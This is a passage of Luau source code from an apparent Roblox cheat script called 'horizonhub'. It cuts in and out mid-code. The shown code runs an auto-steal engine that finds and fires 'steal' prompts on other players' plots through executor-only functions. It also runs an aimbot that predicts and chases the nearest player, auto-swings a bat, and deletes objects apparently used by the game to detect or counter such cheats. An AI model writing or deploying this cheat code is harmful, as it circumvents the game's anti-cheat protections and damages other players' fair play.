                statusRightLbl.Text = "INSTA STEAL READY - V4"
                border.Color = BLUE_STROKE
            elseif state == "OFF" then
                stealLabel.Text = "OFF"
                stealLabel.TextColor3 = Color3.fromRGB(165, 195, 230)
                activePill.BackgroundColor3 = BLUE_OFF
                statusRightLbl.Text = "INSTA STEAL READY - V4"
                border.Color = Color3.fromRGB(35, 75, 130)
            end
        end,
        Reset = function()
            fillLine.Size = UDim2.new(0, 0, 1, 0)
            pctLbl.Text = ""
            stealLabel.Text = "ACTIVE"
            stealLabel.TextColor3 = Color3.fromRGB(5, 16, 36)
            activePill.BackgroundColor3 = BLUE_ACTIVE
            statusRightLbl.Text = "INSTA STEAL READY - V4"
            border.Color = BLUE_STROKE
        end
    }
    _G.StealBar.Reset()
end
_G.setupNexusGrabBar = setupNexusGrabBar
task.delay(0.15, setupNexusGrabBar)

task.spawn(function()
    local lastFrame = tick()
    local fpsSamples = {}
    local fpsAvg = 60
    RunService.RenderStepped:Connect(function()
        local now = tick()
        local dt = now - lastFrame
        lastFrame = now
        if dt > 0 then
            table.insert(fpsSamples, 1 / dt)
            if #fpsSamples > 30 then table.remove(fpsSamples, 1) end
            local sum = 0
            for _, v in ipairs(fpsSamples) do sum = sum + v end
            fpsAvg = sum / #fpsSamples
        end
    end)
    while true do
        task.wait(0.5)
        pcall(function()
            if ProgressPercentLabel and ProgressPercentLabel.Parent then
                local ping = 0
                if LP and LP.GetNetworkPing then
                    ping = math.floor(LP:GetNetworkPing() * 1000 + 0.5)
                else
                    local stat = Stats.Network.ServerStatsItem["Data Ping"]
                    if stat then ping = math.floor(tonumber(stat:GetValue()) or 0) end
                end
                local pctStr = tostring(math.floor(_currentStealProgress * 100 + 0.5)) .. "%"
                ProgressPercentLabel.Text = string.format("%s | FPS:%d | PING:%dms", pctStr, math.floor(fpsAvg + 0.5), ping)
            end
        end)
    end
end)

local function getHRP()
    local char = LP.Character
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart")
        or char:FindFirstChild("Torso")
        or char:FindFirstChild("UpperTorso")
end
local function isMyBase(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end




local SemiV3State = {
    conn = nil, isStealing = false, stealStartTime = nil, Data = {},
    HalfFireRange = 10, HalfHoldMin = 1.3, HalfHoldMax = 2.6, HalfEntryDelay = 0.3,
    lastScan = 0, lastFallbackScan = 0, lastFallbackResult = nil,
}
local function sv3PromptDist(prompt)
    local char = LP.Character
    if not char then return math.huge end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return math.huge end
    local part = prompt.Parent
    if part and part:IsA("Attachment") then part = part.Parent end
    while part and not part:IsA("BasePart") and part ~= workspace and part.Parent ~= nil do
        part = part.Parent
    end
    if part and part:IsA("BasePart") then return (part.Position - root.Position).Magnitude end
    local ok, cf = pcall(function() return prompt.Parent and prompt.Parent.WorldPosition end)
    if ok and cf then return (cf - root.Position).Magnitude end
    return math.huge
end
local function sv3IsStealPrompt(pr)
    if not (pr and pr:IsA("ProximityPrompt")) then return false end
    local a = (pr.ActionText or ""):lower()
    return a:find("steal") ~= nil or a:find("grab") ~= nil or a:find("snatch") ~= nil
end
local function sv3FindNearestPrompt()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return nil end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest, dist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyBase(plot.Name) then
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods then
                for _, pod in ipairs(pods:GetChildren()) do
                    local base = pod:FindFirstChild("Base")
                    local sp = base and base:FindFirstChild("Spawn")
                    if sp then
                        local d = (sp.Position - root.Position).Magnitude
                        if d <= Radii.SemiV3 and d < dist then
                            local found = nil
                            local att = sp:FindFirstChild("PromptAttachment")
                            if att then
                                for _, pr in ipairs(att:GetChildren()) do
                                    if sv3IsStealPrompt(pr) then found = pr end
                                end
                            end
                            if not found then
                                for _, pr in ipairs(sp:GetDescendants()) do
                                    if sv3IsStealPrompt(pr) then found = pr end
                                end
                            end
                            if found then nearest, dist = found, d end
                        end
                    end
                end
            end
        end
    end
    return nearest
end
-- Generic fallback scan: if the AnimalPodiums/Spawn structure above was not
-- found (different map / game update), search every ProximityPrompt on enemy
-- plots that looks like a steal prompt. Throttled by the caller.
local function sv3FindNearestPromptFallback()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return nil end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest, dist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyBase(plot.Name) then
            for _, pr in ipairs(plot:GetDescendants()) do
                if pr:IsA("ProximityPrompt") then
                    local a = (pr.ActionText or ""):lower()
                    if a:find("steal") or a:find("grab") then
                        local d = sv3PromptDist(pr)
                        if d <= Radii.SemiV3 and d < dist then
                            nearest, dist = pr, d
                        end
                    end
                end
            end
        end
    end
    return nearest
end
local function sv3CaptureConnections(prompt, data)
    if not getconnections then return end
    pcall(function()
        for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
            if c.Function then table.insert(data.hold, c.Function) end
        end
        for _, c in ipairs(getconnections(prompt.Triggered)) do
            if c.Function then table.insert(data.trigger, c.Function) end
        end
    end)
end
local function sv3FireHold(data)
    for _, fn in ipairs(data.hold) do task.spawn(fn) end
end
local function sv3FireTrigger(prompt, data)
    if #data.trigger > 0 then
        for _, fn in ipairs(data.trigger) do task.spawn(fn) end
        return
    end
    -- No captured handlers (executor without getconnections, or the game
    -- connected later). Simulate the prompt directly instead of doing nothing.
    if fireproximityprompt then
        pcall(function() fireproximityprompt(prompt) end)
        return
    end
    pcall(function() prompt:InputHoldBegin() end)
    task.wait(0.3)
    pcall(function() prompt:InputHoldEnd() end)
end
local function sv3ExecuteSteal(prompt)
    if SemiV3State.isStealing then return end
    if not SemiV3State.Data[prompt] then
        SemiV3State.Data[prompt] = {hold = {}, trigger = {}, ready = true}
        sv3CaptureConnections(prompt, SemiV3State.Data[prompt])
    end
    local data = SemiV3State.Data[prompt]
    if not data.ready then return end
    data.ready = false
    SemiV3State.isStealing = true
    SemiV3State.stealStartTime = tick()
    task.spawn(function()
        local fired = false
        local ok, err = pcall(function()
            sv3FireHold(data)
            task.wait(SemiV3State.HalfHoldMin)
            local lastWasInRange = sv3PromptDist(prompt) <= SemiV3State.HalfFireRange
            while true do
                local el = tick() - SemiV3State.stealStartTime
                if el > SemiV3State.HalfHoldMax or not prompt.Parent then break end
                setProgress(math.clamp(el / SemiV3State.HalfHoldMax, 0, 1))
                local nowInRange = sv3PromptDist(prompt) <= SemiV3State.HalfFireRange
                local firedNow = false
                if nowInRange then
                    if lastWasInRange then
                        firedNow = true
                    else
                        task.wait(0.3)
                        if sv3PromptDist(prompt) <= SemiV3State.HalfFireRange and prompt.Parent then
                            firedNow = true
                        else
                            lastWasInRange = false
                            task.wait()
                        end
                    end
                    if firedNow then
                        sv3FireTrigger(prompt, data)
                        fired = true
                        break
                    end
                else
                    lastWasInRange = nowInRange
                    task.wait()
                end
            end
        end)
        if not ok then warn("[horizonhub] steal error: " .. tostring(err)) end
        if fired then setProgress(1) end
        task.wait(0.05)
        setProgress(0)
        -- Always unlock, even if something above threw.
        data.ready = true
        SemiV3State.isStealing = false
    end)
end
local function startSemiV3Mode()
    if SemiV3State.conn then pcall(function() SemiV3State.conn:Disconnect() end); SemiV3State.conn = nil end
    SemiV3State.isStealing = false
    SemiV3State.conn = RunService.Heartbeat:Connect(function()
        if not isEnabled then return end
        local now = tick()
        -- Watchdog: if a steal ever gets stuck (error inside a captured
        -- connection etc.), force-unlock the engine so it never dies.
        if SemiV3State.isStealing then
            if SemiV3State.stealStartTime and (now - SemiV3State.stealStartTime) > (SemiV3State.HalfHoldMax + 3) then
                SemiV3State.isStealing = false
                for _, d in pairs(SemiV3State.Data) do d.ready = true end
                setProgress(0)
            end
            return
        end
        -- Throttle the world scan (no need to run it 60x per second).
        if now - (SemiV3State.lastScan or 0) < 0.2 then return end
        SemiV3State.lastScan = now
        local ok, p = pcall(sv3FindNearestPrompt)
        if not p and (now - (SemiV3State.lastFallbackScan or 0)) > 1.5 then
            SemiV3State.lastFallbackScan = now
            task.spawn(function()
                local ok2, p2 = pcall(sv3FindNearestPromptFallback)
                if ok2 then SemiV3State.lastFallbackResult = p2 end
            end)
        end
        if not p and SemiV3State.lastFallbackResult then
            local d = sv3PromptDist(SemiV3State.lastFallbackResult)
            if d <= Radii.SemiV3 then p = SemiV3State.lastFallbackResult end
        end
        if ok and p then pcall(sv3ExecuteSteal, p) end
    end)
end
local function stopSemiV3Mode()
    if SemiV3State.conn then pcall(function() SemiV3State.conn:Disconnect() end); SemiV3State.conn = nil end
    SemiV3State.isStealing = false
    setProgress(0)
end




local function stopAll()
    stopSemiV3Mode()
    setProgress(0)
end
local function startAll()
    if not isEnabled then return end
    startSemiV3Mode()
end

-- ============================================================
-- UI BRIDGE  (this was MISSING -> the "Instant Steal" toggle
-- button in the main GUI did nothing, and the Radius box too)
-- ============================================================
_G.YousefInstantSteal = {
    SetEnabled = function(v)
        -- Legacy compatibility only; Galaxy V1/V2 owns Auto Steal.
        isEnabled = (v == true)
        saveConfig()
    end,
    GetEnabled = function() return isEnabled end,
    SetRadius = function(v)
        local n = tonumber(v) or Radii.SemiV3
        n = math.max(1, math.floor(n + 0.5))
        Radii.Normal = n
        Radii.Semi   = n
        Radii.SemiV2 = n
        Radii.SemiV3 = n
        saveConfig()
    end,
    GetRadius = function() return Radii.SemiV3 end,
    SetMode = function(m)
        selectedMode = "SemiV3"
        saveConfig()
    end,
    GetMode = function() return "V1" end,
}

-- The Galaxy V1/V2 engine below owns Auto Steal. Do not start the legacy
-- Instant/Semi engine from this older block.
end) end)
-- end of legacy insta steal helpers
repeat task.wait() until game:IsLoaded()

Players, RunService, __HH.UIS, TS, Lighting, __HH.HS = game:GetService("Players"), game:GetService("RunService"), game:GetService("UserInputService"), game:GetService("TweenService"), game:GetService("Lighting"), game:GetService("HttpService")
LP = Players.LocalPlayer

__HH.antiRagdollEnabled, __HH.infJumpEnabled = false, false
__HH.medusaCounterEnabled = false
__HH.medusaResetEnabled = false
__HH.batCounterEnabled = false
__HH.unwalkEnabled = false
__HH.medusaDebounce, __HH.medusaLastUsed, __HH.dropActive = false, 0, false
Conns = {autoSteal = nil, antiRag = nil, batCounter = nil, anchor = {}}
__HH.tpLockEnabled = false
__HH.tpLockSetVisual = nil
__HH.mobBtnRefs = nil
__HH.batV2Enabled = false
__HH.batV2SetVisual = nil
__HH.antiDieEnabled = false
__HH.setAntiDieVisual = nil
__HH.antiDieConns = {}
__HH.setBatCounterVisual = nil
local startBatCounter, stopBatCounter
__HH.antiLagEnabled = false
__HH.removeAccessoriesEnabled = false
__HH.antiLagDescConn = nil
__HH.stretchRezEnabled = false
__HH.stretchRezConn = nil
__HH.setStretchRezVisual = nil

-- FRHUB Auto Left / Auto Right state, UI setters and controller functions.
-- Pure is already near Luau's 200-local limit, so these cross-script bridge
-- names are initialized explicitly while the implementation itself is scoped.
autoLeftEnabled, autoRightEnabled = false, false
autoLeftSetVisual, autoRightSetVisual = nil, nil
startAutoLeft, stopAutoLeft, startAutoRight, stopAutoRight = nil, nil, nil, nil
toggleAutoLeft, toggleAutoRight = nil, nil

__HH.unwalkSavedAnimate = nil
__HH._anyKeyListening = false
end
do
__HH._lastKbSet = 0
__HH.autoTPEnabled = false
__HH.autoTPHeight = 20
__HH.autoTPConn = nil
__HH.setAutoTPVisual = nil
__HH.setInfJumpVisual = nil
__HH.mainFrame = nil
__HH.bgImage = nil
local _guiLocked = false

setCarryVisual = nil
setLaggerVisual = nil
setAutoSwingVisual = nil
__HH.setBatCounterVisual = nil
setAntiRagVisual = nil
setMedusaVisual = nil
setMedusaResetVisual = nil
setUnwalkVisual = nil
setAntiLagVisual = nil
__HH.setStretchRezVisual = nil
__HH.setAutoTPVisual = nil
setSaturationVisual = nil
setVoidModeVisual = nil
setStretchRezV2Visual = nil
setTranspVisual = nil
setLockVisual = nil
setMobVisual = nil
setCircleBtnsVisual = nil
setShapeVisual = nil
setRectVisual = nil
__HH.setInfJumpVisual = nil

__HH.espEnabled = false
__HH.headlessEnabled = false
__HH.korbloxEnabled = false
__HH.setESPVisual = nil

uiScaleValue = 0.6
__HH.uiScaleObject = nil

__HH.TOGGLE_ON_COLOR = Color3.fromRGB(171, 225, 255)

-- ============================================
-- FRHUBVELOCITYv67 engine ports: Normal = V7, Bypass = V11 BYPASS.
-- Only the requested backends are imported, not FR's UI, loaders, config files,
-- god-mode/anti-lava code, or unrelated aimbot versions.
if type(aimbotV1Speed) ~= "number" then aimbotV1Speed = 56 end
if batAimMode ~= "normal" and batAimMode ~= "bypass" then batAimMode = "normal" end
autoBatEnabled = autoBatEnabled == true

do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LP = Players.LocalPlayer

    -- Tear down the previous port on a rerun. Also stop both branches of the
    -- pre-port backend, whose old bypass getter did not report V2 correctly.
    pcall(function()
        if _G.PureAimbotPort and _G.PureAimbotPort.Destroy then
            _G.PureAimbotPort.Destroy()
        elseif type(_G.PureCursedSetAimbot) == "function" then
            local previousMode = batAimMode
            batAimMode = "normal"; pcall(_G.PureCursedSetAimbot, false)
            batAimMode = "bypass"; pcall(_G.PureCursedSetAimbot, false)
            batAimMode = previousMode
        end
        if type(_G.HHGoodAimSet) == "function" then _G.HHGoodAimSet(false) end
    end)

    local S = {destroyed = false, activeMode = nil, connections = {}, normalVersion = "FR V7", bypassVersion = "FR V11 BYPASS"}
    local v7, v11 = {}, {}
    local ownedMirror = nil
    local function track(connection)
        S.connections[#S.connections + 1] = connection
        return connection
    end
    local function aimSpeed()
        return math.clamp(tonumber(aimbotV1Speed) or 56, 1, 500)
    end
    local function v11CombatSpeed()
        if laggerCarryToggled == true then return tonumber(LAGGER_CARRY_SPEED) or 40 end
        if laggerModeEnabled == true then return tonumber(LAGGER_SPEED) or 40 end
        return aimSpeed()
    end
    local function zeroRoot(root)
        if not root then return end
        pcall(function() root.Velocity = Vector3.zero end)
        pcall(function() root.AssemblyLinearVelocity = Vector3.zero end)
        pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
    end
    -- FR V7 core (the same backend used by FR's AIMBOT V7 panel).
    do
        local CFG = {
            SPEED                 = 58,
            VERT_SPEED            = 58,
            HEIGHT                = 1,
            V_OFF                 = 0,
            TURN_SPEED            = 40,
            MAX_TORQUE            = 500000,
            JUMP_PREDICT          = 0.35,
            TP_DOWN_PREDICT       = 0.5,
            JUMP_DETECT_THRESHOLD = 0,
            MAX_JUMP_HISTORY      = 12,
            JUMP_COUNT_TRIGGER    = 0,
            TP_DOWN_VEL_THRESHOLD = -80,
            TP_DOWN_RESPONSE_DIST = 8,
            VEL_SAMPLES           = 6,
            POS_SAMPLES           = 4,
            PREDICT_PCT           = 120,
            SWING_COOLDOWN        = 0.08,
            autoSwing             = true,
            BatSpam               = false,
            SpamDelay             = 50,
            keybind               = "V",
        }

        local aimEnabled, batEquippedThisRun = false, false
        local angVelc, angVelcAtt, SpamThread = nil, nil, nil
        local swingCD = false
        local _intendedVel = Vector3.zero
        local _velHistory, _posHistory, _jumpHistory = {}, {}, {}
        local _infiniteJumpDetected, _tpDownDetected, _jumpCount = false, false, 0
        local _peakY, _normalModeTimer, _lastTargetY = 0, 0, 0
        local DETECT_NAMES = {"LockBAV","LockAngVel","LockBodyAtt","BatLock","LockBAVAtt","AutoBatAtt","AutoBatAV","AntiBatDet","AntiAim","VelocityLock"}

        local function purgeHRP(hrp)
            if not hrp then return end
            pcall(function()
                for _, n in ipairs(DETECT_NAMES) do
                    local o = hrp:FindFirstChild(n)
                    if o then o:Destroy() end
                end
                for _, c in ipairs(hrp:GetChildren()) do
                    local low = c.Name:lower()
                    if c.Name ~= "_UA_AngV" and c.Name ~= "_UA_Att"
                    and c.Name ~= "_PR_AngV" and c.Name ~= "_PR_Att"
                    and c.Name ~= "_GB_AngV" and c.Name ~= "_GB_Att"
                    and (low:find("lockb") or low:find("lockangv") or low:find("batlock") or low:find("antiaim") or low:find("velocitylock")) then
                        pcall(function() c:Destroy() end)
                    end
                end
            end)
        end

        local function setupAngVelc(hrp)
            pcall(function()
                local o1 = hrp:FindFirstChild("_UA_AngV")
                local o2 = hrp:FindFirstChild("_UA_Att")
                if o1 then o1:Destroy() end
                if o2 then o2:Destroy() end
            end)
            local att = Instance.new("Attachment"); att.Name = "_UA_Att"; att.Parent = hrp
            local av = Instance.new("AngularVelocity")
            av.Name = "_UA_AngV"; av.Attachment0 = att
            av.RelativeTo = Enum.ActuatorRelativeTo.World
            av.MaxTorque = CFG.MAX_TORQUE; av.AngularVelocity = Vector3.zero; av.Parent = hrp
            angVelcAtt = att; angVelc = av
        end
        local function cleanAngVelc()
            pcall(function() if angVelc    and angVelc.Parent    then angVelc:Destroy()    end end)
            pcall(function() if angVelcAtt and angVelcAtt.Parent then angVelcAtt:Destroy() end end)
            angVelc = nil; angVelcAtt = nil
        end

        local TARGET_PARTS = {"HumanoidRootPart", "Torso", "UpperTorso", "Head", "LowerTorso"}

        local function findBestPart(myHRP)
            local nearestHRP  = nil
            local nearestDist = math.huge
            local bestPart    = nil
            for _, p in Players:GetPlayers() do
                if p ~= LP and p.Character then
                    local eh  = p.Character:FindFirstChild("HumanoidRootPart")
                    local hum = p.Character:FindFirstChildOfClass("Humanoid")
                    if eh and hum and hum.Health > 0 then
                        local d = (eh.Position - myHRP.Position).Magnitude
                        if d < nearestDist then
                            nearestDist = d
                            nearestHRP  = eh
                            local closestPart = eh
                            local closestD    = d
                            for _, pName in ipairs(TARGET_PARTS) do
                                local part = p.Character:FindFirstChild(pName)
                                if part and part:IsA("BasePart") then
                                    local pd = (part.Position - myHRP.Position).Magnitude
                                    if pd < closestD then
                                        closestD    = pd
                                        closestPart = part
                                    end
                                end
                            end
                            bestPart = closestPart
                        end
                    end
                end
            end
            return nearestHRP, nearestDist, bestPart
        end

        local function detectInfiniteJump(targetHRP)
            if not targetHRP then
                _infiniteJumpDetected = false; _tpDownDetected = false; _jumpCount = 0
                return "normal"
            end
            local velY = targetHRP.Velocity.Y
            local posY = targetHRP.Position.Y
            if posY > _peakY then _peakY = posY end
            local upwardSpikes = 0
            for i = 2, #_jumpHistory do
                if _jumpHistory[i] > CFG.JUMP_DETECT_THRESHOLD
                and _jumpHistory[i-1] < CFG.JUMP_DETECT_THRESHOLD * 0.3 then
                    upwardSpikes = upwardSpikes + 1
                end
            end
            if upwardSpikes >= CFG.JUMP_COUNT_TRIGGER and not _infiniteJumpDetected then
                _infiniteJumpDetected = true; _jumpCount = upwardSpikes; _peakY = posY; _tpDownDetected = false
            end
            if _infiniteJumpDetected and velY < CFG.TP_DOWN_VEL_THRESHOLD then
                _tpDownDetected = true; return "tp_down"
            end
            if _infiniteJumpDetected and velY < -20 and (posY < _peakY - 5) then return "falling" end
            if _infiniteJumpDetected and math.abs(velY) < 5 and posY < _lastTargetY + 2 then
                _normalModeTimer = _normalModeTimer + 1
                if _normalModeTimer > 8 then
                    _infiniteJumpDetected = false; _tpDownDetected = false; _jumpCount = 0
                    _peakY = 0; _normalModeTimer = 0; _jumpHistory = {}
                    return "normal"
                end
            else
                _normalModeTimer = 0
            end
            _lastTargetY = posY
            if _infiniteJumpDetected then return _tpDownDetected and "tp_down" or "infinite_jump" end
            return "normal"
        end

        local GRAVITY = -196.2

        local function computePredictedPos(myHRP, targetHRP, bestPart, mode)
            local aimPart   = bestPart or targetHRP
            local curPos    = aimPart.Position
            local rawCurVel = aimPart.Velocity
            local xzSpikeMag = math.abs(rawCurVel.X) + math.abs(rawCurVel.Z)
            local curVel
            if xzSpikeMag > 400 then
                if #_velHistory > 0 then
                    local safe = _velHistory[#_velHistory]
                    curVel = Vector3.new(safe.X, rawCurVel.Y, safe.Z)
                else
                    curVel = Vector3.new(0, rawCurVel.Y, 0)
                end
            else
                curVel = rawCurVel
            end
            table.insert(_velHistory, curVel)
            if #_velHistory > CFG.VEL_SAMPLES then table.remove(_velHistory, 1) end
            table.insert(_posHistory, curPos)
            if #_posHistory > CFG.POS_SAMPLES then table.remove(_posHistory, 1) end
            table.insert(_jumpHistory, rawCurVel.Y)
            if #_jumpHistory > CFG.MAX_JUMP_HISTORY then table.remove(_jumpHistory, 1) end
            local accel = Vector3.zero
            if #_velHistory >= 3 then
                local newest = _velHistory[#_velHistory]
                local oldest = _velHistory[1]
                accel = (newest - oldest) / math.max(#_velHistory * 0.016, 0.016)
            end
            local wasTeleported = false
            if #_posHistory >= 2 then
                local delta = _posHistory[#_posHistory] - _posHistory[#_posHistory - 1]
                if delta.Magnitude > 12 then
                    wasTeleported = true
                    _velHistory = {}
                    _posHistory = { curPos }
                end
            end
            local targetVelXZ = Vector3.new(curVel.X, 0, curVel.Z)
            local targetSpeed  = targetVelXZ.Magnitude
            local mySpeed      = math.max(CFG.SPEED, 1)
            local dXZ          = Vector3.new(curPos.X - myHRP.Position.X, 0, curPos.Z - myHRP.Position.Z)
            local vv  = targetVelXZ:Dot(targetVelXZ)
            local dv  = dXZ:Dot(targetVelXZ)
            local dd  = dXZ:Dot(dXZ)
            local ia  = vv - mySpeed * mySpeed
            local ib  = 2 * dv
            local interceptT
            if math.abs(ia) < 0.01 then
                interceptT = dXZ.Magnitude / math.max(mySpeed - targetSpeed * 0.5, 1)
            else
                local disc = ib * ib - 4 * ia * dd
                if disc < 0 then
                    interceptT = dXZ.Magnitude / mySpeed
                else
                    local sq = math.sqrt(disc)
                    local t1 = (-ib - sq) / (2 * ia)
                    local t2 = (-ib + sq) / (2 * ia)
                    if     t1 > 0.001 and t2 > 0.001 then interceptT = math.min(t1, t2)
                    elseif t1 > 0.001                  then interceptT = t1
                    elseif t2 > 0.001                  then interceptT = t2
                    else                                    interceptT = dXZ.Magnitude / mySpeed
                    end
                end
            end
            interceptT = math.clamp(interceptT, 0.02, 1.5)
            local pctMult  = math.max(CFG.PREDICT_PCT / 100, 0.05)
            local leadTime = math.clamp(interceptT * pctMult, 0.02, 1.5)
            local predictedPos
            local isEmergency = false
            if wasTeleported then
                predictedPos = curPos + curVel * math.min(leadTime, 0.08)
            elseif mode == "tp_down" then
                local landX = curPos.X + curVel.X * CFG.TP_DOWN_PREDICT
                local landZ = curPos.Z + curVel.Z * CFG.TP_DOWN_PREDICT
                local rp = RaycastParams.new()
                rp.FilterDescendantsInstances = {LP.Character}; rp.FilterType = Enum.RaycastFilterType.Exclude
                local rr = workspace:Raycast(Vector3.new(landX, curPos.Y, landZ), Vector3.new(0, -200, 0), rp)
                local gy = rr and rr.Position.Y or curPos.Y
                predictedPos = Vector3.new(landX, gy + CFG.HEIGHT + 3, landZ)
                isEmergency = true
            elseif mode == "infinite_jump" then
                local jt = CFG.JUMP_PREDICT
                predictedPos = curPos + Vector3.new(curVel.X * jt * 0.5, -2, curVel.Z * jt * 0.5)
            elseif curVel.Y < -28 then
                local deltaY = curVel.Y * 0.22
                local disc   = curVel.Y * curVel.Y - 2 * GRAVITY * math.abs(deltaY)
                local ballT  = disc > 0 and ((-curVel.Y - math.sqrt(disc)) / (-GRAVITY)) or 0.18
                ballT = math.clamp(ballT, 0.04, 0.55)
                local blendT = math.max(leadTime, ballT)
                predictedPos = Vector3.new(
                    curPos.X + curVel.X * blendT,
                    curPos.Y + curVel.Y * ballT + 0.5 * GRAVITY * ballT * ballT + 2.8,
                    curPos.Z + curVel.Z * blendT
                )
            elseif curVel.Y > 28 then
                local tPeak  = curVel.Y / math.abs(GRAVITY)
                local blendT = math.min(leadTime, tPeak * 1.2)
                predictedPos = Vector3.new(
                    curPos.X + curVel.X * blendT + accel.X * blendT * blendT * 0.5,
                    curPos.Y + curVel.Y * blendT + 0.5 * GRAVITY * blendT * blendT,
                    curPos.Z + curVel.Z * blendT + accel.Z * blendT * blendT * 0.5
                )
            else
                predictedPos = curPos + curVel * leadTime + accel * (leadTime * leadTime * 0.5)
            end
            if targetVelXZ.Magnitude > 1 and not wasTeleported then
                local fwdDir     = targetVelXZ.Unit
                local relToTgt   = myHRP.Position - curPos
                local relXZ      = Vector3.new(relToTgt.X, 0, relToTgt.Z)
                local relDot     = relXZ:Dot(fwdDir)
                local minAhead   = 4
                local catchUp    = math.max(minAhead - relDot, 0)
                local speedBonus = math.clamp(targetSpeed * 0.09, 1, 5)
                local totalBias  = math.clamp(catchUp + speedBonus, 2, 14)
                predictedPos = predictedPos + Vector3.new(fwdDir.X * totalBias, 0, fwdDir.Z * totalBias)
            end
            predictedPos = predictedPos + Vector3.new(0, CFG.V_OFF, 0)
            return predictedPos, isEmergency
        end

        local function startBatSpam()
            if SpamThread then return end
            SpamThread = task.spawn(function()
                while CFG.BatSpam do
                    pcall(function()
                        local char = LP.Character
                        if char then
                            local bat = char:FindFirstChild("bat") or char:FindFirstChild("Bat")
                            if not bat then
                                for _, tool in pairs(LP.Backpack:GetChildren()) do
                                    if tool.Name:lower() == "bat" then bat = tool break end
                                end
                            end
                            if bat and bat:IsA("Tool") then
                                bat:Activate()
                                local hrp = char:FindFirstChild("HumanoidRootPart")
                                if hrp then
                                    local _, nearDist, _ = findBestPart(hrp)
                                    if nearDist and nearDist < 6 then
                                        task.wait(0.02)
                                        bat:Activate()
                                    end
                                end
                            end
                        end
                    end)
                    task.wait(CFG.SpamDelay / 1000)
                end
                SpamThread = nil
            end)
        end
        local function stopBatSpam()
            CFG.BatSpam = false
            SpamThread  = nil
        end

        local function resetHistory()
            _velHistory, _posHistory, _jumpHistory = {}, {}, {}
            _infiniteJumpDetected, _tpDownDetected, _jumpCount = false, false, 0
            _peakY, _normalModeTimer, _lastTargetY = 0, 0, 0
            _intendedVel = Vector3.zero
            swingCD = false
            v7.target = nil
        end
        v7.cfg = CFG
        v7.enabled = function() return aimEnabled end
        v7.clearVelocity = function()
            _intendedVel = Vector3.zero
            if angVelc then pcall(function() angVelc.AngularVelocity = Vector3.zero end) end
            zeroRoot(v7.lastRoot)
            local char = LP.Character
            zeroRoot(char and char:FindFirstChild("HumanoidRootPart"))
        end
        v7.start = function()
            if S.destroyed or aimEnabled then return end
            resetHistory()
            aimEnabled, batEquippedThisRun = true, false
            CFG.SPEED = aimSpeed() -- Pure's existing AIM BOT Speed control.
            local char = LP.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                v7.lastRoot = root
                purgeHRP(root)
                setupAngVelc(root)
            end
            if CFG.BatSpam then startBatSpam() end
        end
        v7.stop = function()
            local wasEnabled = aimEnabled
            aimEnabled, batEquippedThisRun = false, false
            local spam = SpamThread
            stopBatSpam()
            if spam and task.cancel then pcall(task.cancel, spam) end
            if wasEnabled then v7.clearVelocity() end
            local oldHumanoid = v7.lastRoot and v7.lastRoot.Parent and v7.lastRoot.Parent:FindFirstChildOfClass("Humanoid")
            local char = LP.Character
            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
            if wasEnabled then
                if oldHumanoid then pcall(function() oldHumanoid.AutoRotate = true end) end
                if humanoid then pcall(function() humanoid.AutoRotate = true end) end
            end
            cleanAngVelc()
            resetHistory()
            v7.lastRoot = nil
        end
        track(RunService.Heartbeat:Connect(function()
            if not aimEnabled or S.destroyed then return end
            CFG.SPEED = aimSpeed()
            local char = LP.Character
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root or not hum or hum.Health <= 0 then v7.target = nil; return end
            v7.lastRoot = root
            purgeHRP(root)
            if not angVelc or not angVelc.Parent or angVelc.Parent ~= root then cleanAngVelc(); setupAngVelc(root) end
            if not batEquippedThisRun then
                batEquippedThisRun = true
                if not char:FindFirstChildOfClass("Tool") then
                    local bp  = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
                    local bat = bp and bp:FindFirstChild("Bat")
                    if bat then pcall(function() hum:EquipTool(bat) end) end
                end
            end
            local target, dist, bestPart = findBestPart(root)
            v7.target = target
            if not target then
                zeroRoot(root) -- clear stale movement on target loss
                hum.AutoRotate = true
                if angVelc then pcall(function() angVelc.AngularVelocity = Vector3.zero end) end
                return
            end
            local mode = detectInfiniteJump(target)
            local predictedPos, isEmergency = computePredictedPos(root, target, bestPart, mode)
            hum.AutoRotate = false
            pcall(function()
                if not angVelc or not angVelc.Parent then return end
                local dCF = CFrame.lookAt(root.Position, predictedPos)
                local rCF = root.CFrame:ToObjectSpace(dCF)
                local ax, an = rCF:ToAxisAngle()
                if an > 0.01 then
                    angVelc.AngularVelocity = root.CFrame:VectorToWorldSpace(ax) * (an * CFG.TURN_SPEED)
                else
                    angVelc.AngularVelocity = Vector3.zero
                end
            end)
            local moveDir = predictedPos - root.Position
            local hDir    = Vector3.new(moveDir.X, 0, moveDir.Z)
            local hVel    = hDir.Magnitude > 0.1 and hDir.Unit * CFG.SPEED or Vector3.zero
            local vVel
            if isEmergency then
                vVel = Vector3.new(0, math.sign(moveDir.Y) * CFG.VERT_SPEED * 1.3, 0)
            elseif math.abs(moveDir.Y) > 0.1 then
